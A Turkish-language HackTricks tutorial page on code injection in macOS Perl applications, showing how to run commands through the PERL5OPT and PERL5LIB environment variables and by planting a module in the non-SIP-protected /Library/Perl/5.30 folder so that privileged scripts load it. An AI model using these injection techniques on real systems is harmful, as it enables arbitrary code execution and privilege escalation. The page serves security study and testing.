# macOS Perl Uygulamaları Enjeksiyonu

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek hackleme püf noktalarını paylaşın.

</details>
{% endhint %}

## `PERL5OPT` ve `PERL5LIB` Çevresel Değişkeni Aracılığıyla

Çevresel değişken PERL5OPT kullanılarak perl'in keyfi komutları çalıştırması mümkündür.\
Örneğin, bu betiği oluşturun:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Şimdi **çevre değişkenini ihraç et** ve **perl** betiğini çalıştır:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Başka bir seçenek, bir Perl modülü oluşturmaktır (ör. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Ve ardından çevresel değişkenleri kullanın:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Bağımlılıklar Aracılığıyla

Perl'in çalıştırıldığı bağımlılıkların klasör sırasını listelemek mümkündür:
```bash
perl -e 'print join("\n", @INC)'
```
Hangi şu şekilde bir şey döndürecek:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Bazı dönen klasörler bile mevcut değil, ancak **`/Library/Perl/5.30`** mevcut, **SIP** tarafından **korunmuyor** ve **SIP** tarafından korunan klasörlerden **önce** bulunuyor. Bu nedenle, birisi o klasörü kötüye kullanarak betik bağımlılıklarını ekleyebilir ve yüksek ayrıcalıklı Perl betiği onu yükleyebilir.

{% hint style="warning" %}
Ancak, o klasöre yazmak için **kök kullanıcı olmanız gerektiğini** unutmayın ve günümüzde bu **TCC uyarısı** alacaksınız:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Örneğin, bir betik **`use File::Basename;`** içe aktarıyorsa, `/Library/Perl/5.30/File/Basename.pm` oluşturarak keyfi kodları çalıştırmasını sağlamak mümkün olacaktır.

## Referanslar

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
